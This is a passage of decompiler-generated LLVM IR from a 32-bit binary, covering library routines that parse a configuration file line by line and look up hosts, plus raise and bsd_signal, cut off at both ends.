  %v6_804f62f59 = phi i32 [ %v6_804f62f53, %dec_label_pc_804f639.lr.ph ], [ %v6_804f62f, %dec_label_pc_804f62e ]
  %v2_804f62f58 = phi i8 [ %v2_804f62f50, %dec_label_pc_804f639.lr.ph ], [ %v2_804f62f, %dec_label_pc_804f62e ]
  %v1_804f62f57 = phi i8* [ %v1_804f62f49, %dec_label_pc_804f639.lr.ph ], [ %v1_804f62f, %dec_label_pc_804f62e ]
  %v0_804f62e56 = phi i32 [ %v0_804f62f.pre, %dec_label_pc_804f639.lr.ph ], [ %v1_804f62e, %dec_label_pc_804f62e ]
  store i32 %v0_804f639.pre, i32* @eax, align 4
  %v2_804f63e = sext i8 %v2_804f62f58 to i32
  store i32 %v2_804f63e, i32* @edx, align 4
  %v2_804f641 = mul nsw i32 %v2_804f63e, 2
  %v3_804f641 = add i32 %v0_804f639.pre, %v2_804f641
  %v4_804f641 = inttoptr i32 %v3_804f641 to i8*
  %v5_804f641 = load i8, i8* %v4_804f641, align 1
  %v6_804f641 = and i8 %v5_804f641, 32
  %v7_804f641 = icmp eq i8 %v6_804f641, 0
  %v1_804f645 = icmp eq i1 %v7_804f641, false
  br i1 %v1_804f645, label %dec_label_pc_804f62e, label %dec_label_pc_804f647

dec_label_pc_804f647:                             ; preds = %dec_label_pc_804f639
  %v10_804f647 = icmp eq i8 %v2_804f62f58, 10
  br i1 %v10_804f647, label %dec_label_pc_804f7a2, label %dec_label_pc_804f650

dec_label_pc_804f650:                             ; preds = %dec_label_pc_804f647
  %v10_804f650 = icmp eq i8 %v2_804f62f58, 35
  %v1_804f65b = icmp eq i1 %v10_804f650, false
  br i1 %v1_804f65b, label %dec_label_pc_804f6ac.preheader, label %dec_label_pc_804f7a2

dec_label_pc_804f6ac.preheader:                   ; preds = %dec_label_pc_804f650
  %v2_804f6ac6 = load i8, i8* %v1_804f62f57, align 1
  %v3_804f6ac7 = icmp eq i8 %v2_804f6ac6, 0
  br i1 %v3_804f6ac7, label %dec_label_pc_804f6b8, label %dec_label_pc_804f6b1

dec_label_pc_804f662:                             ; preds = %dec_label_pc_804f6b1
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_804f666 = load i32, i32* @esp, align 4
  %v3_804f666 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_804f666 = add nuw nsw i32 %v3_804f666, 152
  %v5_804f666 = add i32 %v4_804f666, %v1_804f666
  %v6_804f666 = inttoptr i32 %v5_804f666 to i32*
  store i32 %v0_804f666, i32* %v6_804f666, align 4
  %v0_804f670.pre = load i32, i32* @ebx, align 4
  %v4_804f670.pre = load i32, i32* @ecx, align 4
  %v1_804f67060 = inttoptr i32 %v0_804f670.pre to i8*
  %v2_804f67061 = load i8, i8* %v1_804f67060, align 1
  %v3_804f67062 = zext i8 %v2_804f67061 to i32
  %v5_804f67063 = and i32 %v4_804f670.pre, -256
  %v6_804f67064 = or i32 %v3_804f67062, %v5_804f67063
  %v4_804f67265 = icmp eq i8 %v2_804f67061, 0
  br i1 %v4_804f67265, label %dec_label_pc_804f68f.preheader, label %dec_label_pc_804f676.lr.ph

dec_label_pc_804f676.lr.ph:                       ; preds = %dec_label_pc_804f662
  %v0_804f676.pre = load i32, i32* @global_var_8053720, align 32
  br label %dec_label_pc_804f676

dec_label_pc_804f66f:                             ; preds = %dec_label_pc_804f684
  %v1_804f66f = add i32 %v0_804f66f67, 1
  store i32 %v1_804f66f, i32* @ebx, align 4
  %v1_804f670 = inttoptr i32 %v1_804f66f to i8*
  %v2_804f670 = load i8, i8* %v1_804f670, align 1
  %v3_804f670 = zext i8 %v2_804f670 to i32
  %v5_804f670 = and i32 %v6_804f67069, -256
  %v6_804f670 = or i32 %v3_804f670, %v5_804f670
  %v4_804f672 = icmp eq i8 %v2_804f670, 0
  br i1 %v4_804f672, label %dec_label_pc_804f68f.preheader, label %dec_label_pc_804f676

dec_label_pc_804f676:                             ; preds = %dec_label_pc_804f676.lr.ph, %dec_label_pc_804f66f
  %v6_804f67069 = phi i32 [ %v6_804f67064, %dec_label_pc_804f676.lr.ph ], [ %v6_804f670, %dec_label_pc_804f66f ]
  %v2_804f67068 = phi i8 [ %v2_804f67061, %dec_label_pc_804f676.lr.ph ], [ %v2_804f670, %dec_label_pc_804f66f ]
  %v0_804f66f67 = phi i32 [ %v0_804f670.pre, %dec_label_pc_804f676.lr.ph ], [ %v1_804f66f, %dec_label_pc_804f66f ]
  store i32 %v0_804f676.pre, i32* @eax, align 4
  %v2_804f67b = sext i8 %v2_804f67068 to i32
  store i32 %v2_804f67b, i32* @edx, align 4
  %v2_804f67e = mul nsw i32 %v2_804f67b, 2
  %v3_804f67e = add i32 %v0_804f676.pre, %v2_804f67e
  %v4_804f67e = inttoptr i32 %v3_804f67e to i8*
  %v5_804f67e = load i8, i8* %v4_804f67e, align 1
  %v6_804f67e = and i8 %v5_804f67e, 32
  %v7_804f67e = icmp eq i8 %v6_804f67e, 0
  %v1_804f682 = icmp eq i1 %v7_804f67e, false
  br i1 %v1_804f682, label %dec_label_pc_804f68f.preheader, label %dec_label_pc_804f684

dec_label_pc_804f684:                             ; preds = %dec_label_pc_804f676
  %v10_804f684 = icmp eq i8 %v2_804f67068, 10
  %v1_804f687 = icmp eq i1 %v10_804f684, false
  br i1 %v1_804f687, label %dec_label_pc_804f66f, label %dec_label_pc_804f68f.preheader

dec_label_pc_804f68f.preheader:                   ; preds = %dec_label_pc_804f684, %dec_label_pc_804f676, %dec_label_pc_804f66f, %dec_label_pc_804f662
  %v0_804f66f.lcssa = phi i32 [ %v0_804f670.pre, %dec_label_pc_804f662 ], [ %v1_804f66f, %dec_label_pc_804f66f ], [ %v0_804f66f67, %dec_label_pc_804f676 ], [ %v0_804f66f67, %dec_label_pc_804f684 ]
  %v6_804f670.lcssa = phi i32 [ %v6_804f67064, %dec_label_pc_804f662 ], [ %v6_804f670, %dec_label_pc_804f66f ], [ %v6_804f67069, %dec_label_pc_804f676 ], [ %v6_804f67069, %dec_label_pc_804f684 ]
  %v1_804f68f75 = inttoptr i32 %v0_804f66f.lcssa to i8*
  %v2_804f68f76 = load i8, i8* %v1_804f68f75, align 1
  %v3_804f68f77 = zext i8 %v2_804f68f76 to i32
  %v5_804f68f78 = and i32 %v6_804f670.lcssa, -256
  %v6_804f68f79 = or i32 %v3_804f68f77, %v5_804f68f78
  store i32 %v6_804f68f79, i32* @ecx, align 4
  %v4_804f69180 = icmp eq i8 %v2_804f68f76, 0
  br i1 %v4_804f69180, label %dec_label_pc_804f6a8, label %dec_label_pc_804f695

dec_label_pc_804f68b:                             ; preds = %dec_label_pc_804f6a3, %dec_label_pc_804f695
  store i8 0, i8* %v1_804f68f83, align 1
  %v0_804f68e = load i32, i32* @ebx, align 4
  %v1_804f68e = add i32 %v0_804f68e, 1
  store i32 %v1_804f68e, i32* @ebx, align 4
  %v4_804f68f.pre = load i32, i32* @ecx, align 4
  %v1_804f68f = inttoptr i32 %v1_804f68e to i8*
  %v2_804f68f = load i8, i8* %v1_804f68f, align 1
  %v3_804f68f = zext i8 %v2_804f68f to i32
  %v5_804f68f = and i32 %v4_804f68f.pre, -256
  %v6_804f68f = or i32 %v3_804f68f, %v5_804f68f
  store i32 %v6_804f68f, i32* @ecx, align 4
  %v4_804f691 = icmp eq i8 %v2_804f68f, 0
  br i1 %v4_804f691, label %dec_label_pc_804f6a8, label %dec_label_pc_804f695

dec_label_pc_804f695:                             ; preds = %dec_label_pc_804f68f.preheader, %dec_label_pc_804f68b
  %v2_804f68f84 = phi i8 [ %v2_804f68f, %dec_label_pc_804f68b ], [ %v2_804f68f76, %dec_label_pc_804f68f.preheader ]
  %v1_804f68f83 = phi i8* [ %v1_804f68f, %dec_label_pc_804f68b ], [ %v1_804f68f75, %dec_label_pc_804f68f.preheader ]
  %v0_804f6ac82 = phi i32 [ %v1_804f68e, %dec_label_pc_804f68b ], [ %v0_804f66f.lcssa, %dec_label_pc_804f68f.preheader ]
  %v0_804f695 = load i32, i32* @global_var_8053720, align 32
  store i32 %v0_804f695, i32* @eax, align 4
  %v2_804f69a = sext i8 %v2_804f68f84 to i32
  store i32 %v2_804f69a, i32* @edx, align 4
  %v2_804f69d = mul nsw i32 %v2_804f69a, 2
  %v3_804f69d = add i32 %v0_804f695, %v2_804f69d
  %v4_804f69d = inttoptr i32 %v3_804f69d to i8*
  %v5_804f69d = load i8, i8* %v4_804f69d, align 1
  %v6_804f69d = and i8 %v5_804f69d, 32
  %v7_804f69d = icmp eq i8 %v6_804f69d, 0
  %v1_804f6a1 = icmp eq i1 %v7_804f69d, false
  br i1 %v1_804f6a1, label %dec_label_pc_804f68b, label %dec_label_pc_804f6a3

dec_label_pc_804f6a3:                             ; preds = %dec_label_pc_804f695
  %v10_804f6a3 = icmp eq i8 %v2_804f68f84, 10
  br i1 %v10_804f6a3, label %dec_label_pc_804f68b, label %dec_label_pc_804f6a8

dec_label_pc_804f6a8:                             ; preds = %dec_label_pc_804f68b, %dec_label_pc_804f6a3, %dec_label_pc_804f68f.preheader
  %v0_804f6ac.lcssa = phi i32 [ %v0_804f66f.lcssa, %dec_label_pc_804f68f.preheader ], [ %v0_804f6ac82, %dec_label_pc_804f6a3 ], [ %v1_804f68e, %dec_label_pc_804f68b ]
  %v1_804f68f.lcssa = phi i8* [ %v1_804f68f75, %dec_label_pc_804f68f.preheader ], [ %v1_804f68f83, %dec_label_pc_804f6a3 ], [ %v1_804f68f, %dec_label_pc_804f68b ]
  %v4_804f6a8 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_804f6ac = load i8, i8* %v1_804f68f.lcssa, align 1
  %v3_804f6ac = icmp eq i8 %v2_804f6ac, 0
  br i1 %v3_804f6ac, label %dec_label_pc_804f6b8, label %dec_label_pc_804f6b1

dec_label_pc_804f6b1:                             ; preds = %dec_label_pc_804f6ac.preheader, %dec_label_pc_804f6a8
  %v0_804f666 = phi i32 [ %v0_804f6ac.lcssa, %dec_label_pc_804f6a8 ], [ %v0_804f62e56, %dec_label_pc_804f6ac.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_804f6a8, %dec_label_pc_804f6a8 ], [ 0, %dec_label_pc_804f6ac.preheader ]
  %v7_804f6b6 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_804f6b6, label %dec_label_pc_804f6b8, label %dec_label_pc_804f662

dec_label_pc_804f6b8:                             ; preds = %dec_label_pc_804f6a8, %dec_label_pc_804f6b1, %dec_label_pc_804f6ac.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_804f6ac.preheader ], [ %v4_804f6a8, %dec_label_pc_804f6a8 ], [ %stack_var_-196.013, %dec_label_pc_804f6b1 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_804f6bf = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8052da7.406 to i32), i32* %stack_var_-216, align 4
  %v5_804f6cc = call i32 @__GI_strcoll(i8* %v4_804f6cc, i32 ptrtoint ([11 x i8]* @global_var_8052da7.406 to i32), i32 %v0_804f6bf, i32 %v0_804f6bf)
  store i32 %v5_804f6cc, i32* @eax, align 4
  %v1_804f6d4 = icmp eq i32 %v5_804f6cc, 0
  br i1 %v1_804f6d4, label %dec_label_pc_804f6fc.preheader, label %dec_label_pc_804f70d

dec_label_pc_804f6fc.preheader:                   ; preds = %dec_label_pc_804f6b8
  %v0_804f6fc89 = load i32, i32* @esi, align 4
  %v5_804f70098 = icmp slt i32 %v0_804f6fc89, %stack_var_-196.0.lcssa
  br i1 %v5_804f70098, label %dec_label_pc_804f702.lr.ph, label %dec_label_pc_804f70d

dec_label_pc_804f702.lr.ph:                       ; preds = %dec_label_pc_804f6fc.preheader
  %v0_804f702.pre = load i32, i32* @global_var_80561d4.339, align 4
  br label %dec_label_pc_804f702

dec_label_pc_804f6da:                             ; preds = %dec_label_pc_804f702
  %v2_804f6dd = mul i32 %v0_804f6fc99, 4
  %v4_804f6dd = add i32 %v2_804f6dd, %v3_804f6dd
  %v5_804f6dd = inttoptr i32 %v4_804f6dd to i32*
  %v6_804f6dd = load i32, i32* %v5_804f6dd, align 4
  %v1_804f6e4 = add i32 %v0_804f6fc99, 1
  store i32 %v1_804f6e4, i32* @esi, align 4
  %v1_804f6e5 = inttoptr i32 %v6_804f6dd to i8*
  %v2_804f6e5 = call i32 @__GI_strdup(i8* %v1_804f6e5)
  %v1_804f6ed = load i32, i32* @ebx, align 4
  %v2_804f6ed = mul i32 %v1_804f6ed, 4
  %v3_804f6ed = add i32 %v2_804f6ed, 134570440
  %v4_804f6ed = inttoptr i32 %v3_804f6ed to i32*
  store i32 %v2_804f6e5, i32* %v4_804f6ed, align 4
  %v0_804f6f4 = load i32, i32* @ebx, align 4
  %v1_804f6f4 = add i32 %v0_804f6f4, 1
  store i32 %v1_804f6f4, i32* @eax, align 4
  store i32 %v1_804f6f4, i32* @global_var_80561d4.339, align 4
  %v0_804f6fc = load i32, i32* @esi, align 4
  %v5_804f700 = icmp slt i32 %v0_804f6fc, %stack_var_-196.0.lcssa
  br i1 %v5_804f700, label %dec_label_pc_804f702, label %dec_label_pc_804f70d

dec_label_pc_804f702:                             ; preds = %dec_label_pc_804f702.lr.ph, %dec_label_pc_804f6da
  %v0_804f702 = phi i32 [ %v0_804f702.pre, %dec_label_pc_804f702.lr.ph ], [ %v1_804f6f4, %dec_label_pc_804f6da ]
  %v0_804f6fc99 = phi i32 [ %v0_804f6fc89, %dec_label_pc_804f702.lr.ph ], [ %v0_804f6fc, %dec_label_pc_804f6da ]
  store i32 %v0_804f702, i32* @ebx, align 4
  %v7_804f70b = icmp sgt i32 %v0_804f702, 2
  br i1 %v7_804f70b, label %dec_label_pc_804f70d, label %dec_label_pc_804f6da

dec_label_pc_804f70d:                             ; preds = %dec_label_pc_804f6fc.preheader, %dec_label_pc_804f6da, %dec_label_pc_804f702, %dec_label_pc_804f6b8
  %v0_804f70d = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8052db2.407 to i32), i32* %stack_var_-216, align 4
  %v0_804f714 = load i32, i32* @edi, align 4
  %v4_804f715 = inttoptr i32 %v0_804f714 to i8*
  %v5_804f715 = call i32 @__GI_strcoll(i8* %v4_804f715, i32 ptrtoint ([7 x i8]* @global_var_8052db2.407 to i32), i32 %v0_804f70d, i32 %v0_804f70d)
  store i32 %v5_804f715, i32* @eax, align 4
  %v1_804f71d = icmp eq i32 %v5_804f715, 0
  br i1 %v1_804f71d, label %dec_label_pc_804f75f.preheader, label %dec_label_pc_804f721

dec_label_pc_804f721:                             ; preds = %dec_label_pc_804f70d
  %v0_804f721 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8052db9.408 to i32), i32* %stack_var_-216, align 4
  %v0_804f728 = load i32, i32* @edi, align 4
  %v4_804f729 = inttoptr i32 %v0_804f728 to i8*
  %v5_804f729 = call i32 @__GI_strcoll(i8* %v4_804f729, i32 ptrtoint ([7 x i8]* @global_var_8052db9.408 to i32), i32 %v0_804f721, i32 %v0_804f721)
  %v1_804f731 = icmp eq i32 %v5_804f729, 0
  br i1 %v1_804f731, label %dec_label_pc_804f75f.preheader, label %dec_label_pc_804f7a2

dec_label_pc_804f75f.preheader:                   ; preds = %dec_label_pc_804f70d, %dec_label_pc_804f721
  %v0_804f75f100 = load i32, i32* @global_var_80561d8.401, align 8
  %tmp43103 = icmp slt i32 %v0_804f75f100, 1
  %tmp44104 = icmp eq i1 %tmp43103, false
  br i1 %tmp44104, label %dec_label_pc_804f737, label %dec_label_pc_804f768

dec_label_pc_804f737:                             ; preds = %dec_label_pc_804f75f.preheader, %dec_label_pc_804f737.dec_label_pc_804f737_crit_edge
  %v0_804f75f105 = phi i32 [ %v0_804f75f, %dec_label_pc_804f737.dec_label_pc_804f737_crit_edge ], [ %v0_804f75f100, %dec_label_pc_804f75f.preheader ]
  %v1_804f737 = add i32 %v0_804f75f105, -1
  %v1_804f73b = mul i32 %v1_804f737, 4
  %v2_804f73b = add i32 %v1_804f73b, 134570424
  %v3_804f73b = inttoptr i32 %v2_804f73b to i32*
  %v4_804f73b = load i32, i32* %v3_804f73b, align 4
  store i32 %v1_804f737, i32* @global_var_80561d8.401, align 8
  %v1_804f747 = call i32 @free(i32 %v4_804f73b)
  %v0_804f74c = load i32, i32* @global_var_80561d8.401, align 8
  %v1_804f754 = mul i32 %v0_804f74c, 4
  %v2_804f754 = add i32 %v1_804f754, ptrtoint (i32* @global_var_80561b8.409 to i32)
  %v3_804f754 = inttoptr i32 %v2_804f754 to i32*
  store i32 0, i32* %v3_804f754, align 4
  %v0_804f75f = load i32, i32* @global_var_80561d8.401, align 8
  %tmp43 = icmp slt i32 %v0_804f75f, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_804f737.dec_label_pc_804f737_crit_edge, label %dec_label_pc_804f768

dec_label_pc_804f737.dec_label_pc_804f737_crit_edge: ; preds = %dec_label_pc_804f737
  br label %dec_label_pc_804f737

dec_label_pc_804f768:                             ; preds = %dec_label_pc_804f737, %dec_label_pc_804f75f.preheader
  %v0_804f75f.lcssa = phi i32 [ %v0_804f75f100, %dec_label_pc_804f75f.preheader ], [ %v0_804f75f, %dec_label_pc_804f737 ]
  store i32 1, i32* @esi, align 4
  %v5_804f795115 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_804f795115, label %dec_label_pc_804f797, label %dec_label_pc_804f7a2

dec_label_pc_804f76f:                             ; preds = %dec_label_pc_804f797
  %v2_804f772 = mul i32 %v0_804f779117, 4
  %v4_804f772 = add i32 %v2_804f772, %v3_804f6dd
  %v5_804f772 = inttoptr i32 %v4_804f772 to i32*
  %v6_804f772 = load i32, i32* %v5_804f772, align 4
  %v1_804f779 = add i32 %v0_804f779117, 1
  store i32 %v1_804f779, i32* @esi, align 4
  %v1_804f77a = inttoptr i32 %v6_804f772 to i8*
  %v2_804f77a = call i32 @__GI_strdup(i8* %v1_804f77a)
  %v1_804f782 = load i32, i32* @ebx, align 4
  %v2_804f782 = mul i32 %v1_804f782, 4
  %v3_804f782 = add i32 %v2_804f782, 134570424
  %v4_804f782 = inttoptr i32 %v3_804f782 to i32*
  store i32 %v2_804f77a, i32* %v4_804f782, align 4
  %v0_804f789 = load i32, i32* @ebx, align 4
  %v1_804f789 = add i32 %v0_804f789, 1
  store i32 %v1_804f789, i32* @global_var_80561d8.401, align 8
  %v0_804f791.pre = load i32, i32* @esi, align 4
  %v5_804f795 = icmp slt i32 %v0_804f791.pre, %stack_var_-196.0.lcssa
  br i1 %v5_804f795, label %dec_label_pc_804f797, label %dec_label_pc_804f7a2

dec_label_pc_804f797:                             ; preds = %dec_label_pc_804f768, %dec_label_pc_804f76f
  %v0_804f779117 = phi i32 [ %v0_804f791.pre, %dec_label_pc_804f76f ], [ 1, %dec_label_pc_804f768 ]
  %v0_804f797116 = phi i32 [ %v1_804f789, %dec_label_pc_804f76f ], [ %v0_804f75f.lcssa, %dec_label_pc_804f768 ]
  store i32 %v0_804f797116, i32* @ebx, align 4
  %v7_804f7a0 = icmp sgt i32 %v0_804f797116, 3
  br i1 %v7_804f7a0, label %dec_label_pc_804f7a2, label %dec_label_pc_804f76f

dec_label_pc_804f7a2:                             ; preds = %dec_label_pc_804f62f.preheader, %dec_label_pc_804f62e, %dec_label_pc_804f768, %dec_label_pc_804f797, %dec_label_pc_804f76f, %dec_label_pc_804f721, %dec_label_pc_804f650, %dec_label_pc_804f647, %dec_label_pc_804f7a2.preheader
  %v0_804f7a2 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_804f7a9, i32* @ebx, align 4
  %v3_804f7ae = call i32 @fgets(i32 %v2_804f7a9, i32 128, i32 %v0_804f7a2)
  store i32 %v3_804f7ae, i32* @eax, align 4
  %v1_804f7b6 = icmp eq i32 %v3_804f7ae, 0
  %v1_804f7b8 = icmp eq i1 %v1_804f7b6, false
  br i1 %v1_804f7b8, label %dec_label_pc_804f62f.preheader, label %dec_label_pc_804f7be

dec_label_pc_804f62f.preheader:                   ; preds = %dec_label_pc_804f7a2
  %v0_804f62f.pre = load i32, i32* @ebx, align 4
  %v4_804f62f.pre = load i32, i32* @ecx, align 4
  %v1_804f62f49 = inttoptr i32 %v0_804f62f.pre to i8*
  %v2_804f62f50 = load i8, i8* %v1_804f62f49, align 1
  %v3_804f62f51 = zext i8 %v2_804f62f50 to i32
  %v5_804f62f52 = and i32 %v4_804f62f.pre, -256
  %v6_804f62f53 = or i32 %v3_804f62f51, %v5_804f62f52
  store i32 %v6_804f62f53, i32* @ecx, align 4
  %v4_804f63154 = icmp eq i8 %v2_804f62f50, 0
  br i1 %v4_804f63154, label %dec_label_pc_804f7a2, label %dec_label_pc_804f639.lr.ph

dec_label_pc_804f639.lr.ph:                       ; preds = %dec_label_pc_804f62f.preheader
  %v0_804f639.pre = load i32, i32* @global_var_8053720, align 32
  br label %dec_label_pc_804f639

dec_label_pc_804f7be:                             ; preds = %dec_label_pc_804f7a2
  %v0_804f7c1 = load i32, i32* @ebp, align 4
  %v1_804f7c2 = inttoptr i32 %v0_804f7c1 to i16*
  %v2_804f7c2 = call i32 @__GI_fclose(i16* %v1_804f7c2)
  br label %dec_label_pc_804f7d7

dec_label_pc_804f7cc:                             ; preds = %dec_label_pc_804f60b
  %v0_804f7cc = call i32 @__GI___h_errno_location()
  %v1_804f7d1 = inttoptr i32 %v0_804f7cc to i32*
  store i32 3, i32* %v1_804f7d1, align 4
  br label %dec_label_pc_804f7d7

dec_label_pc_804f7d7:                             ; preds = %entry, %dec_label_pc_804f7be, %dec_label_pc_804f7cc
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_804f5c4, i32* @eax, align 4
  %v2_804f7e3 = call i32 @__pthread_return_void(i32 %v2_804f5c4, i32 1)
  store i32 %v0_804f5b0, i32* @ebp, align 4
  ret i32 %v2_804f7e3

; uselistorder directives
  uselistorder i32 %v0_804f639.pre, { 1, 0 }
  uselistorder i32 %v6_804f62f53, { 1, 0 }
  uselistorder i8 %v2_804f62f50, { 1, 2, 0 }
  uselistorder i8* %v1_804f62f49, { 1, 0 }
  uselistorder i32 %v0_804f62f.pre, { 1, 0 }
  uselistorder i32 %v0_804f75f, { 0, 2, 1 }
  uselistorder i32 %v0_804f702, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804f69a, { 1, 0 }
  uselistorder i32 %v2_804f67b, { 1, 0 }
  uselistorder i32 %v1_804f66f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804f63e, { 1, 0 }
  uselistorder i32 %v1_804f62e, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 15, 12, 11, 10, 9, 8, 7, 6, 25, 24, 23, 22, 5, 4, 3, 2, 1, 0, 14, 13, 16, 21, 20, 19, 18, 17 }
  uselistorder i32* @global_var_80561d8.401, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 11, 3, 4, 5, 6, 12, 10, 7, 8, 9 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_80561d4.339, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8053730.338 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_804f7d7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f7a2, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_804f797, { 1, 0 }
  uselistorder label %dec_label_pc_804f737, { 1, 0 }
  uselistorder label %dec_label_pc_804f75f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f70d, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804f702, { 1, 0 }
  uselistorder label %dec_label_pc_804f6b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f6b1, { 1, 0 }
  uselistorder label %dec_label_pc_804f6a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f695, { 1, 0 }
  uselistorder label %dec_label_pc_804f676, { 1, 0 }
  uselistorder label %dec_label_pc_804f7a2.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_804f817 = inttoptr i32 %arg3 to i32*
  %v10_804f817 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_804f817, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_804f817
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804f823 = call i32 @__libc_getpid()
  %v2_804f82f = call i32 @kill(i32 %v0_804f823, i32 %arg1)
  ret i32 %v2_804f82f

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804f838 = load i32, i32* @ebx, align 4
  %v15_804f839 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804f84d = icmp eq i32 %arg2, -1
  br i1 %v10_804f84d, label %dec_label_pc_804f85b, label %dec_label_pc_804f852

dec_label_pc_804f852:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_804f85b, label %dec_label_pc_804f856

dec_label_pc_804f856:                             ; preds = %dec_label_pc_804f852
  %v7_804f859 = icmp sgt i32 %arg1, 64
  br i1 %v7_804f859, label %dec_label_pc_804f85b, label %dec_label_pc_804f868

dec_label_pc_804f85b:                             ; preds = %dec_label_pc_804f856, %dec_label_pc_804f852, %entry
  %v1_804f85b = call i32 @__errno_location(i32 %v0_804f838)
  store i32 %v1_804f85b, i32* %eax.global-to-local, align 4
  %v1_804f860 = inttoptr i32 %v1_804f85b to i32*
  store i32 22, i32* %v1_804f860, align 4
  br label %dec_label_pc_804f8dc

dec_label_pc_804f868:                             ; preds = %dec_label_pc_804f856
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f876

dec_label_pc_804f876:                             ; preds = %dec_label_pc_804f876.dec_label_pc_804f876_crit_edge, %dec_label_pc_804f868
  %v0_804f876 = phi i32 [ %v15_804f839, %dec_label_pc_804f868 ], [ %v0_804f876.pre, %dec_label_pc_804f876.dec_label_pc_804f876_crit_edge ]
  %v1_804f88117 = phi i32 [ 31, %dec_label_pc_804f868 ], [ %v1_804f881, %dec_label_pc_804f876.dec_label_pc_804f876_crit_edge ]
  %v2_804f876 = mul i32 %v1_804f88117, 4
  %v3_804f876 = add i32 %v2_804f876, 160
  %v4_804f876 = add i32 %v3_804f876, %v0_804f876
  %v5_804f876 = inttoptr i32 %v4_804f876 to i32*
  store i32 0, i32* %v5_804f876, align 4
  %v0_804f881.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804f881 = add i32 %v0_804f881.pre, -1
  %v9_804f881 = icmp slt i32 %v1_804f881, 0
  store i32 %v1_804f881, i32* %eax.global-to-local, align 4
  %v1_804f882 = icmp eq i1 %v9_804f881, false
  br i1 %v1_804f882, label %dec_label_pc_804f876.dec_label_pc_804f876_crit_edge, label %dec_label_pc_804f884

dec_label_pc_804f876.dec_label_pc_804f876_crit_edge: ; preds = %dec_label_pc_804f876
  %v0_804f876.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f876

dec_label_pc_804f884:                             ; preds = %dec_label_pc_804f876
  %v0_804f884 = load i32, i32* @edx, align 4
  %v2_804f887 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804f887, i32* %eax.global-to-local, align 4
  %v4_804f88f = call i32 @__sigaddset(i32 %v2_804f887, i32 %arg1, i32 %v0_804f884, i32 %v0_804f884)
  store i32 %v4_804f88f, i32* %eax.global-to-local, align 4
  %v2_804f897 = icmp slt i32 %v4_804f88f, 0
  br i1 %v2_804f897, label %dec_label_pc_804f8dc, label %dec_label_pc_804f89b

dec_label_pc_804f89b:                             ; preds = %dec_label_pc_804f884
  %v4_804f8a3 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_80561e0.410 to i32), i32 %arg1, i32 %v4_804f88f, i32 %v4_804f88f)
  %v2_804f8bc = ptrtoint i32* %stack_var_-284 to i32
  %v2_804f8c1 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804f8c1, i32* %eax.global-to-local, align 4
  %v4_804f8ca = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804f8bc)
  store i32 %v4_804f8ca, i32* %eax.global-to-local, align 4
  %v2_804f8d2 = icmp slt i32 %v4_804f8ca, 0
